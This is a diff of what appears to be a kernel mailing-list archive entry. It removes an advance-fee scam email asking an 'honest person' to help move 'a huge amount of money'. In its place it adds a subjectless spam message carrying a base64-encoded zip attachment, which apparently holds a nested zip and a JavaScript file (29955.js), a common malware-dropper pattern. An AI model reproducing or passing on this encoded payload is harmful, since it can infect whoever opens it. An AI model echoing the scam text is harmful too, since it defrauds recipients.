@@ -1,32 +1,73 @@
-From: "Mr Albert Yang" <alber.yang22@gmail.com>
-Subject: Viable partnership request.
-Date: Thu, 18 May 2017 21:52:51 +0100
-Message-ID: <20170518205253.DFEA1A84525@balva.myphotos.cc>
-Reply-To: alber.yang222@gmail.com
+From: <mitch_128@hotmail.com>
+Subject: (unknown)
+Date: Mon, 22 May 2017 16:10:58 -0000
+Message-ID: <149546945864.6150.16286004066646084952@muravlenko.ru>
 Mime-Version: 1.0
-Content-Type: text/plain
-Content-Transfer-Encoding: 8BIT
+Content-Type: application/zip; name="5877262087.zip"
+Content-Transfer-Encoding: base64
 Return-path: <linux-ide-owner@vger.kernel.org>
-Received: from 74.149.75.80.abo.tutor.fr ([80.75.149.74]:4265 "EHLO
-        balva.myphotos.cc" rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org
-        with ESMTP id S1758058AbdEVK6I (ORCPT
-        <rfc822;linux-ide@vger.kernel.org>); Mon, 22 May 2017 06:58:08 -0400
-Received: from user-PC (69-7-0-18.meganet.net [69.7.0.18])
-        (Authenticated sender: root)
-        by balva.myphotos.cc (Postfix) with ESMTPA id DFEA1A84525
-        for <linux-ide@vger.kernel.org>; Thu, 18 May 2017 22:52:52 +0200 (CEST)
+Received: from adsl-178-46-3-253.muravlenko.ru ([178.46.3.253]:49323 "HELO
+        muravlenko.ru" rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org
+        with SMTP id S933281AbdEVQLF (ORCPT
+        <rfc822;linux-ide@vger.kernel.org>); Mon, 22 May 2017 12:11:05 -0400
+Subject: 
+Content-Disposition: attachment
 Sender: linux-ide-owner@vger.kernel.org
 List-Id: linux-ide@vger.kernel.org
 To: linux-ide@vger.kernel.org
 
-Compliment of the day,
-
-
-I have access to very vital information that can be used to move a huge amount of money. 
-I have done my homework very well and i have the machineries in place to get it done. 
-Ultimately I need an honest person to play an important role in the completion of this business transaction.
-
-
-Regards,
-Albert.
-
+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
